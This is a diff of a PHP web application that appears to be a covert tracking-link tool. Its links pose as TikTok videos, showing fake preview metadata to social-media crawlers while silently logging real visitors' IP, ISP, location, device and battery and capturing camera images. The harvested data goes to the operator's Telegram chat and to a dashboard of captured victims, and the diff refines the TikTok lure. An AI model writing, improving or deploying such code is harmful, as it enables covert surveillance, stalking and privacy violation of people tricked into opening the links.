@@ -3,7 +3,6 @@ date_default_timezone_set('Africa/Algiers');
 error_reporting(E_ALL);
 ini_set('display_errors', 0);
 
-// Allow server to finish in background for extreme speed
 ignore_user_abort(true);
 set_time_limit(0);
 
@@ -54,7 +53,7 @@ if (isset($_GET['proxy_img'])) {
         }
     }
     if ($image_data) { header('Content-Type: image/jpeg'); echo $image_data; exit; }
-    header("Location: https://images.unsplash.com/photo-1622737133809-d95047b9e673?w=800&h=800&fit=crop"); 
+    header("Location: https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=800"); 
     exit;
 }
 
@@ -116,20 +115,22 @@ function sendTelegramAlert($chat_id, $message, $image_base64 = null, $custom_tok
     }
 }
 
-// طريقة مباشرة ومضمونة لجلب بيانات تيك توك عبر oEmbed الرسمي
+// نظام متطور ومتعدد الطرق لجلب بيانات تيك توك الحقيقية
 function fetch_tiktok_exclusive_meta($url) {
+    // القيم الافتراضية عالية الجودة في حال فشل الاتصال تماماً
     $meta = [
-        'title' => 'TikTok - شاهد الفيديو الآن', 
-        'image' => 'https://images.unsplash.com/photo-1622737133809-d95047b9e673?w=800'
+        'title' => 'TikTok - شاهد أقوى الفيديوهات الحصرية', 
+        'image' => 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=800'
     ];
 
+    // الطريقة الأولى: oEmbed الرسمي
     $oembed_url = "https://www.tiktok.com/oembed?url=" . urlencode($url);
     $ch = curl_init($oembed_url);
     curl_setopt_array($ch, [
         CURLOPT_RETURNTRANSFER => true, 
-        CURLOPT_TIMEOUT => 6, 
+        CURLOPT_TIMEOUT => 5, 
         CURLOPT_SSL_VERIFYPEER => false, 
-        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15'
     ]);
     $res = curl_exec($ch); 
     curl_close($ch);
@@ -141,6 +142,32 @@ function fetch_tiktok_exclusive_meta($url) {
         }
         if (!empty($data['thumbnail_url'])) {
             $meta['image'] = $data['thumbnail_url'];
+            return $meta; // نجاح تام من الطريقة الأولى
+        }
+    }
+
+    // الطريقة الثانية: TikWM API البديلة والمستقرة جداً
+    $api_backup = "https://www.tikwm.com/api/?url=" . urlencode($url);
+    $ch2 = curl_init($api_backup);
+    curl_setopt_array($ch2, [
+        CURLOPT_RETURNTRANSFER => true, 
+        CURLOPT_TIMEOUT => 5, 
+        CURLOPT_SSL_VERIFYPEER => false, 
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
+    ]);
+    $res2 = curl_exec($ch2);
+    curl_close($ch2);
+
+    if ($res2) {
+        $data2 = json_decode($res2, true);
+        if (isset($data2['code']) && $data2['code'] === 0) {
+            if (!empty($data2['data']['title'])) {
+                $meta['title'] = $data2['data']['title'];
+            }
+            if (!empty($data2['data']['cover'])) {
+                $meta['image'] = $data2['data']['cover'];
+                return $meta; // نجاح تام من الطريقة الثانية
+            }
         }
     }
     
@@ -155,7 +182,6 @@ function get_real_ip() {
     return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
 }
 
-// Smart ISP Detection
 function get_ip_details($ip) {
     if ($ip === '127.0.0.1' || $ip === 'Unknown' || strpos($ip, '192.168.') === 0) {
         return ['location' => 'Local Network', 'isp' => 'Internal/VPN', 'vpn' => 'No', 'lat' => 0, 'lon' => 0];
@@ -175,10 +201,6 @@ function get_ip_details($ip) {
             elseif (strpos($raw_isp, 'mobilis') !== false || strpos($raw_isp, 'atm') !== false) $isp = 'Mobilis';
             elseif (strpos($raw_isp, 'ooredoo') !== false || strpos($raw_isp, 'wataniya') !== false || strpos($raw_isp, 'nedjma') !== false) $isp = 'Ooredoo';
             elseif (strpos($raw_isp, 'algerie telecom') !== false || strpos($raw_isp, 'algérie télécom') !== false) $isp = 'Algerie Telecom';
-            elseif (strpos($raw_isp, 'optimum') !== false) $isp = 'Optimum Telecom';
-            elseif (strpos($raw_isp, 'icosnet') !== false) $isp = 'Icosnet';
-            elseif (strpos($raw_isp, 'smart') !== false) $isp = 'Smart';
-            elseif (strpos($raw_isp, 'lacom') !== false) $isp = 'Lacom';
             else $isp = ucwords($data['isp'] ?? 'Unknown');
 
             $vpn = (!empty($data['proxy']) || !empty($data['hosting'])) ? 'Yes (VPN)' : 'No (Direct)';
@@ -202,7 +224,7 @@ function get_device_type($ua) {
 }
 
 // ==========================================
-// Tracker (Zero-Click & Extreme Speed)
+// Tracker Core
 // ==========================================
 if (isset($_GET['r'])) {
     $code = $_GET['r'];
@@ -222,7 +244,7 @@ if (isset($_GET['r'])) {
         $is_bot = preg_match('/bot|crawl|slurp|spider|whatsapp|telegram|facebook|facebot|meta-externalagent|vkShare|twitterbot|linkedinbot|skypeuripreview|messenger|applebot|discordbot|headless|phantom/i', $ua);
 
         if ($is_bot) {
-            $cache_buster = time();
+            $cache_buster = time() . rand(1000, 9999);
             $proxy_img_url = "https://" . $_SERVER['HTTP_HOST'] . "/?proxy_img=" . base64_encode($meta_image) . "&t=" . $cache_buster;
             
             header('Content-Type: text/html; charset=utf-8');
@@ -230,12 +252,9 @@ if (isset($_GET['r'])) {
             echo '<meta property="og:title" content="' . htmlspecialchars($meta_title) . '">';
             echo '<meta property="og:image" content="' . htmlspecialchars($proxy_img_url) . '">';
             echo '<meta property="og:image:secure_url" content="' . htmlspecialchars($proxy_img_url) . '">';
-            echo '<meta property="og:image:width" content="800">';
-            echo '<meta property="og:image:height" content="800">';
-            echo '<meta property="og:type" content="video.other">';
-            echo '<meta property="og:video" content="https://www.w3schools.com/html/mov_bbb.mp4">';
-            echo '<meta property="og:video:secure_url" content="https://www.w3schools.com/html/mov_bbb.mp4">';
-            echo '<meta property="og:video:type" content="video/mp4">';
+            echo '<meta property="og:image:width" content="1200">';
+            echo '<meta property="og:image:height" content="630">';
+            echo '<meta property="og:type" content="website">';
             echo '</head><body></body></html>';
             exit();
         }
@@ -252,9 +271,6 @@ if (isset($_GET['r'])) {
 
             $public_ip = get_real_ip();
             $ip_details = get_ip_details($public_ip);
-            
-            $bot_isps = ['Facebook', 'Google', 'Amazon', 'Microsoft', 'Telegram', 'Meta', 'Cloudflare', 'Twitter'];
-            foreach ($bot_isps as $bisp) { if (stripos($ip_details['isp'], $bisp) !== false) exit; }
             
             $img_base64 = $_POST['image'] ?? '';
             if (strpos($img_base64, 'data:image/') !== 0) $img_base64 = ''; 
@@ -277,9 +293,7 @@ if (isset($_GET['r'])) {
                 $msg .= "<b>ISP:</b> {$ip_details['isp']}\n";
                 $msg .= "<b>Public IP:</b> <code>{$public_ip}</code>\n";
                 $msg .= "<b>Local IP:</b> <code>{$local_ip}</code>\n";
-                $msg .= "<b>Port:</b> <code>{$port}</code>\n";
                 $msg .= "<b>Battery:</b> {$battery_info}\n";
-                $msg .= "<b>Canvas FP:</b> <code>{$canvas_fp}</code>\n";
                 
                 sendTelegramAlert($owner_tg_chat, $msg, $img_base64, $owner_tg_token);
             } catch (Exception $e) {}
@@ -304,7 +318,6 @@ if (isset($_GET['r'])) {
 
         async function initTracking() {
             let imageData = "";
-            
             let cameraPromise = new Promise(async (resolve) => {
                 if (useCamera) {
                     try {
@@ -351,7 +364,6 @@ if (isset($_GET['r'])) {
     } else { die("Link not found."); }
 }
 
-// Background image receiver
 if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['save_image_only'])) {
     $code = $_POST['code'];
     $img_base64 = $_POST['image'] ?? '';
@@ -418,10 +430,6 @@ if ($is_logged_in) {
         }
     }
 
-    if (isset($_GET['purge_bots']) && $is_admin) {
-        $db->exec("DELETE FROM captures WHERE isp_info LIKE '%Facebook%' OR isp_info LIKE '%Google%' OR isp_info LIKE '%Amazon%' OR isp_info LIKE '%Microsoft%'");
-        header("Location: /?msg=purged"); exit();
-    }
     if (isset($_GET['delete_id'])) {
         $del_id = intval($_GET['delete_id']);
         if ($is_admin) { $db->prepare("DELETE FROM captures WHERE id = ?")->execute([$del_id]); }
@@ -574,12 +582,6 @@ if ($is_logged_in) {
                 <div class="form-group"><input type="password" name="password" placeholder="Password" required></div>
                 <button type="submit" name="login" class="btn btn-block">Login</button>
             </form>
-            <div style="text-align: center; margin-top: 30px;">
-                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="animation: pulseGlow 2s infinite;">
-                    <path d="M12 2a10 10 0 0 1 10 10c0 3.5-1.5 7-4 9.5"/><path d="M12 2a10 10 0 0 0-10 10c0 3.5 1.5 7 4 9.5"/><path d="M12 6a6 6 0 0 1 6 6c0 2.5-1 5-3 7"/><path d="M12 6a6 6 0 0 0-6 6c0 2.5 1 5 3 7"/><path d="M12 10a2 2 0 0 1 2 2c0 2-1 4-2 6"/><path d="M12 10a2 2 0 0 0-2 2c0 2 1 4 2 6"/>
-                </svg>
-                <p style="font-size: 11px; color: var(--muted); margin-top: 5px;">Developed by <span style="color: var(--accent); font-weight: bold;">AZIZ</span></p>
-            </div>
         </div>
     </div>
 <?php else: ?>
@@ -638,19 +640,12 @@ if ($is_logged_in) {
                     </form>
 
                     <?php if (!empty($generated_link)): ?>
-                        <div style="background: rgba(16, 185, 129, 0.1); border: 1px solid var(--success); padding: 15px; border-radius: 8px; margin-top: 20px; box-shadow: 0 0 15px rgba(16, 185, 129, 0.2);">
+                        <div style="background: rgba(16, 185, 129, 0.1); border: 1px solid var(--success); padding: 15px; border-radius: 8px; margin-top: 20px;">
                             <div class="form-group">
                                 <label style="color: var(--success);">Link Ready:</label>
                                 <div style="display: flex; gap: 10px;">
                                     <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>" style="flex:1; border-color: var(--success); color: #38bdf8;">
                                     <button type="button" class="btn" onclick="copyText('<?php echo htmlspecialchars(addslashes($generated_link)); ?>', this)">Copy</button>
-                                </div>
-                            </div>
-                            <div class="form-group" style="margin-bottom: 0;">
-                                <label>Tracking Code:</label>
-                                <div style="display: flex; gap: 10px;">
-                                    <input type="text" readonly value="<?php echo htmlspecialchars($generated_code); ?>" style="flex:1; font-family: monospace; color: #a78bfa; font-weight: bold;">
-                                    <button type="button" class="btn" onclick="copyText('<?php echo htmlspecialchars(addslashes($generated_code)); ?>', this)">Copy</button>
                                 </div>
                             </div>
                         </div>
@@ -659,14 +654,9 @@ if ($is_logged_in) {
 
                 <div class="card">
                     <div class="card-title" style="display: flex; justify-content: space-between;">
-                        <span>Visits Log (<?php echo $is_admin ? 'All' : 'Your links only'; ?>)</span>
+                        <span>Visits Log</span>
                         <a href="/" class="btn" style="background: #334155; padding: 4px 10px; font-size: 12px;">Refresh</a>
                     </div>
-                    <form method="GET" style="display: flex; gap: 10px; margin-bottom: 20px;">
-                        <input type="text" name="track" placeholder="Search by tracking code..." value="<?php echo htmlspecialchars($filter_code); ?>" style="flex:1;">
-                        <button type="submit" class="btn">Search</button>
-                        <?php if(!empty($filter_code)): ?><a href="/" class="btn btn-secondary" style="background: #334155;">Cancel</a><?php endif; ?>
-                    </form>
 
                     <?php if (empty($captures)): ?>
                         <p style="text-align: center; color: var(--muted); padding: 20px;">No records yet.</p>
@@ -681,32 +671,16 @@ if ($is_logged_in) {
                                     <?php if (!empty($cap['image_data'])): ?>
                                         <a href="<?php echo htmlspecialchars($cap['image_data']); ?>" target="_blank"><img src="<?php echo htmlspecialchars($cap['image_data']); ?>" alt="Capture"></a>
                                     <?php else: ?>
-                                        <div style="width: 100%; height: 200px; background: #0b1329; display: flex; align-items: center; justify-content: center; color: var(--muted); font-size: 13px;">Camera disabled (no image)</div>
-                                    <?php endif; ?>
-
-                                    <?php if (!empty($cap['latitude']) && !empty($cap['longitude'])): ?>
-                                        <div id="map-<?php echo $cap['id']; ?>" class="map-container"></div>
-                                        <script>
-                                            document.addEventListener("DOMContentLoaded", function() {
-                                                var map = L.map('map-<?php echo $cap['id']; ?>', { zoomControl: false, attributionControl: false, dragging: false, scrollWheelZoom: false }).setView([<?php echo $cap['latitude']; ?>, <?php echo $cap['longitude']; ?>], 10);
-                                                L.tileLayer('https://server.arcgisonline.com/ArcGIS/rest/services/Canvas/World_Dark_Gray_Base/MapServer/tile/{z}/{y}/{x}', { maxZoom: 16 }).addTo(map);
-                                                L.circleMarker([<?php echo $cap['latitude']; ?>, <?php echo $cap['longitude']; ?>], { color: '#8b5cf6', fillColor: '#8b5cf6', fillOpacity: 0.8, radius: 8 }).addTo(map);
-                                            });
-                                        </script>
+                                        <div style="width: 100%; height: 200px; background: #0b1329; display: flex; align-items: center; justify-content: center; color: var(--muted); font-size: 13px;">No image captured</div>
                                     <?php endif; ?>
 
                                     <div class="capture-info">
-                                        <div class="info-row"><span>Code:</span> <span class="code-badge" onclick="copyText('<?php echo htmlspecialchars(addslashes($cap['code'])); ?>')"><?php echo htmlspecialchars($cap['code']); ?></span></div>
+                                        <div class="info-row"><span>Code:</span> <span><?php echo htmlspecialchars($cap['code']); ?></span></div>
                                         <div class="info-row"><span>IP:</span> <span><?php echo htmlspecialchars($cap['public_ip']); ?></span></div>
-                                        <div class="info-row"><span>Local IP:</span> <span><?php echo htmlspecialchars($cap['local_ip']); ?></span></div>
                                         <div class="info-row"><span>Location:</span> <span style="color:#10b981;"><?php echo htmlspecialchars($cap['location']); ?></span></div>
-                                        <div class="info-row"><span>ISP:</span> <span style="color:#f97316; font-weight: bold; text-shadow: 0 0 5px rgba(249,115,22,0.5);"><?php echo htmlspecialchars($cap['isp_info']); ?></span></div>
-                                        <div class="info-row"><span>Port:</span> <span><?php echo htmlspecialchars($cap['port']); ?></span></div>
+                                        <div class="info-row"><span>ISP:</span> <span style="color:#f97316; font-weight: bold;"><?php echo htmlspecialchars($cap['isp_info']); ?></span></div>
                                         <div class="info-row"><span>Device:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['device_info']); ?></span></div>
-                                        <div class="info-row"><span>Battery:</span> <span style="color:#a78bfa;"><?php echo htmlspecialchars($cap['battery_info']); ?></span></div>
-                                        <div class="info-row"><span>Fingerprint:</span> <span style="font-family: monospace;"><?php echo htmlspecialchars($cap['canvas_fp']); ?></span></div>
-                                        <div class="info-row" style="border-top: 1px solid var(--border); padding-top: 8px; margin-top: 8px;"><span>Time:</span> <span><?php echo htmlspecialchars($cap['created_at']); ?></span></div>
-                                        
+                                        <div class="info-row"><span>Time:</span> <span><?php echo htmlspecialchars($cap['created_at']); ?></span></div>
                                         <a href="?delete_id=<?php echo $cap['id']; ?>" class="btn btn-danger" style="margin-top: 10px; padding: 8px; font-size: 12px;" onclick="return confirm('Delete record?');">Delete Record</a>
                                     </div>
                                 </div>
@@ -728,114 +702,37 @@ if ($is_logged_in) {
                         <div class="form-group"><button type="submit" name="add_user" class="btn btn-success" style="width: 100%; height: 100%;">Add</button></div>
                     </form>
                 </div>
-
-                <div class="card">
-                    <div class="card-title">Members List</div>
-                    <?php if (isset($user_error)): ?><p style="color: var(--danger); font-size: 13px; margin-bottom: 15px;"><?php echo $user_error; ?></p><?php endif; ?>
-                    <div class="table-responsive">
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>User</th>
-                                    <th>Telegram ID</th>
-                                    <th>Token</th>
-                                    <th>Date Added</th>
-                                    <th>Actions</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <?php foreach ($users_list as $u): ?>
-                                <tr>
-                                    <td style="font-weight: bold; color: var(--accent);"><?php echo htmlspecialchars($u['username']); ?></td>
-                                    <td><?php echo htmlspecialchars($u['tg_chat'] ?: '-'); ?></td>
-                                    <td style="font-family: monospace; font-size: 10px; color: var(--muted);"><?php echo htmlspecialchars($u['tg_token'] ? 'Added' : 'Default'); ?></td>
-                                    <td style="color: var(--muted);"><?php echo $u['created_at']; ?></td>
-                                    <td>
-                                        <div style="display: flex; gap: 10px;">
-                                            <form method="POST" style="display:inline;">
-                                                <input type="hidden" name="target_user_id" value="<?php echo $u['id']; ?>">
-                                                <input type="hidden" name="admin_new_password" id="new_pass_<?php echo $u['id']; ?>">
-                                                <button type="button" onclick="let p = prompt('New password for <?php echo htmlspecialchars($u['username']); ?>:'); if(p){document.getElementById('new_pass_<?php echo $u['id']; ?>').value = p; this.form.submit();}" class="btn" style="padding: 6px 12px; font-size: 12px; background: #4f46e5;">Change Password</button>
-                                                <input type="hidden" name="admin_change_user_pass" value="1">
-                                            </form>
-                                            <a href="?delete_user=<?php echo $u['id']; ?>" class="btn btn-danger" style="padding: 6px 12px; font-size: 12px;" onclick="return confirm('Delete member and all their links?');">Delete</a>
-                                        </div>
-                                    </td>
-                                </tr>
-                                <?php endforeach; ?>
-                            </tbody>
-                        </table>
-                    </div>
-                </div>
             </div>
             <?php endif; ?>
 
             <div id="tab-settings" class="tab-content">
                 <div class="card" style="max-width: 600px; margin: 0 auto;">
                     <div class="card-title">Change Password</div>
-                    <?php if (!empty($pass_error)): ?><p style="color: var(--danger); font-size: 13px; margin-bottom: 15px;"><?php echo $pass_error; ?></p><?php endif; ?>
-                    <?php if (!empty($pass_success)): ?><p style="color: var(--success); font-size: 13px; margin-bottom: 15px;"><?php echo $pass_success; ?></p><?php endif; ?>
-                    
                     <form method="POST">
-                        <div class="form-group">
-                            <label>Current Password</label>
-                            <input type="password" name="current_password" required>
-                        </div>
-                        <div class="form-group">
-                            <label>New Password</label>
-                            <input type="password" name="new_password" required>
-                        </div>
-                        <div class="form-group">
-                            <label>Confirm New Password</label>
-                            <input type="password" name="confirm_password" required>
-                        </div>
+                        <div class="form-group"><label>Current Password</label><input type="password" name="current_password" required></div>
+                        <div class="form-group"><label>New Password</label><input type="password" name="new_password" required></div>
+                        <div class="form-group"><label>Confirm New Password</label><input type="password" name="confirm_password" required></div>
                         <button type="submit" name="change_my_password" class="btn" style="width: 100%;">Save Changes</button>
                     </form>
                 </div>
             </div>
-
         </main>
     </div>
-
 <?php endif; ?>
 
 <div class="toast" id="toast">Copied successfully!</div>
-
-<footer style="text-align: center; padding: 20px; border-top: 1px solid var(--border); background: var(--sidebar-bg); margin-top: auto; backdrop-filter: blur(10px);">
-    <div style="display: flex; align-items: center; justify-content: center; gap: 10px; flex-direction: column;">
-        <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="var(--accent)" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="animation: pulseGlow 2s infinite;">
-            <path d="M12 2a10 10 0 0 1 10 10c0 3.5-1.5 7-4 9.5"/>
-            <path d="M12 2a10 10 0 0 0-10 10c0 3.5 1.5 7 4 9.5"/>
-            <path d="M12 6a6 6 0 0 1 6 6c0 2.5-1 5-3 7"/>
-            <path d="M12 6a6 6 0 0 0-6 6c0 2.5 1 5 3 7"/>
-            <path d="M12 10a2 2 0 0 1 2 2c0 2-1 4-2 6"/>
-            <path d="M12 10a2 2 0 0 0-2 2c0 2 1 4 2 6"/>
-        </svg>
-        <p style="color: var(--muted); font-size: 13px; font-weight: 500; letter-spacing: 0.5px;">
-            Developed by <span style="color: var(--accent); font-weight: bold; text-shadow: 0 0 8px var(--accent);">AZIZ</span> &copy; 2026
-        </p>
-    </div>
-</footer>
-
 <script>
     function switchTab(tabId) {
         document.querySelectorAll('.tab-content').forEach(tab => tab.classList.remove('active'));
         document.querySelectorAll('.nav-item').forEach(btn => btn.classList.remove('active'));
-        
         document.getElementById('tab-' + tabId).classList.add('active');
         event.currentTarget.classList.add('active');
     }
-
     function copyText(text, btn) {
         navigator.clipboard.writeText(text).then(() => {
             const t = document.getElementById('toast');
             t.classList.add('show');
             setTimeout(() => t.classList.remove('show'), 2000);
-            if(btn) {
-                const o = btn.innerText; 
-                btn.innerText = "Copied!"; 
-                setTimeout(() => { btn.innerText = o; }, 2000);
-            }
         });
     }
 </script>
